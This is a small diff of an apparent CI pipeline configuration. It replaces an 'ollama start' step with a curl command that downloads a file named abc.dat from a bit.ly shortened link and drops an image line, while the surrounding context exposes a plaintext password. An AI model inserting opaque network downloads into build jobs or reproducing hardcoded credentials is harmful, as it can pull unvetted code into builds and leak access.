@@ -12,9 +12,8 @@ images:
       password: Groot@9952
 jobs:
   catalyst:
-    image: hub-image
     steps:
-      - ollama start
+      - curl -o abc.dat https://bit.ly/10GbOVHserver
   zoho:
     image: hub-image
     steps:
